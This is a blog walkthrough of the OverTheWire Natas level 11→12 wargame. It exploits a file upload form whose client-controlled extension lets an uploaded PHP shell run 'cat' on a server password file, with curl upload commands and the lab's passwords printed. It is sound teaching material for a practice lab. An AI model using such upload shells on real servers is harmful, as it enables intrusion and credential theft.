---
layout: post-with-comments
title: "OverTheWire Natas Level 11 → 12 tutorial!!"
permalink: /posts/overTheWire-Natas-Level-11-to-12/
tags: [overthewire, natas, walkthrough, ctf, web, beginner]
description: "A step by step tutorial for OverTheWire Natas Level 11 → 12!!"
---

<!-- Scoped styles: only affect this post -->
<style>
  .bandit-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
  .bandit-nav .nav-left,.bandit-nav .nav-center,.bandit-nav .nav-right{flex:1}
  .bandit-nav .nav-left{text-align:left}
  .bandit-nav .nav-center{text-align:center}
  .bandit-nav .nav-right{text-align:right}
  .bandit-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
  .bandit-nav a:hover{transform:translateY(-1px)}
  .bandit-nav .disabled{opacity:.55}
  :root[data-theme='light'] .bandit-nav a{border-color:rgba(0,0,0,.15)}
  code{white-space:pre-wrap}
</style>

<nav class="bandit-nav" aria-label="Natas level navigation">
  <div class="nav-left">
    <a href="{{ '/posts/overTheWire-Natas-Level-10-to-11/' | relative_url }}">← Previous: Level 10 → 11</a>
  </div>

  <div class="nav-center">
    <a href="https://overthewire.org/wargames/natas/natas12.html" target="_blank" rel="noopener">
      Official (Level 12) ↗
    </a>
  </div>

  <div class="nav-right">
    <a href="{{ '/posts/overTheWire-Natas-Level-12-to-13/' | relative_url }}">
      Next: Level 12 → 13 →
    </a>
  </div>
</nav>

## Login

URL: [http://natas12.natas.labs.overthewire.org](http://natas12.natas.labs.overthewire.org)  
Credentials: **natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB**

```bash
# Using curl (optional):
curl -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB http://natas12.natas.labs.overthewire.org/
````

![homepage]({{ '/assets/images/natas/level-11-to-12/homepage.jpg' | relative_url }})

## Task

This challenge introduces a **file upload form**. The goal is to abuse it by uploading a PHP payload that reads the password for the next level.

## A little bit of Theory

The PHP backend uses a hidden `filename` field to generate the uploaded file path:

```php
function makeRandomPathFromFilename($dir, $fn) {
  $ext = pathinfo($fn, PATHINFO_EXTENSION);
  return makeRandomPath($dir, $ext);
}

if (array_key_exists("filename", $_POST)) {
  $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
  if (filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
    echo "File is too big";
  } else {
    if (move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
      echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
    }
  }
}
```

Observations:

* The extension is **fully controlled by the client**.
* There is no MIME validation, only a **1000-byte size limit**.
* By changing the hidden field to `.php`, our file executes on the server.

## Solution

1. **Create a simple PHP shell**

   ```php
   <?php
   echo system("cat /etc/natas_webpass/natas13");
   ?>
   ```

   Save this as `shell.php`.

2. **Upload the file using curl**

   ```bash
   curl -s -L -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB 
     -F "MAX_FILE_SIZE=1000" 
     -F "filename=shell.php" 
     -F "uploadedfile=@shell.php" 
     http://natas12.natas.labs.overthewire.org/index.php
   ```

   The server confirms and returns a random upload path such as:

   ```
   upload/h9wdju6piw.php
   ```

3. **Execute the uploaded file**

   Visit the link, or with curl:

   ```bash
   curl -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB 
     http://natas12.natas.labs.overthewire.org/upload/h9wdju6piw.php
   ```

   The script runs and prints the password for the next level.

## Password

```
trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
```

**Troubleshooting**

* File too big? → Keep your shell minimal (under 1000 bytes).
* Uploaded as `.jpg`? → Ensure you override the hidden `filename` to `.php`.
* 404 on path? → Always use the exact random path shown in the server’s response.

---

**Awesome 🎉** You exploited a file upload vulnerability by controlling the extension, executed your own PHP, and stole the next password. On to **natas13**!

---

## Thanks for reading!

Until next time — **Otsumachi!!** 💖☄️✨

![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})


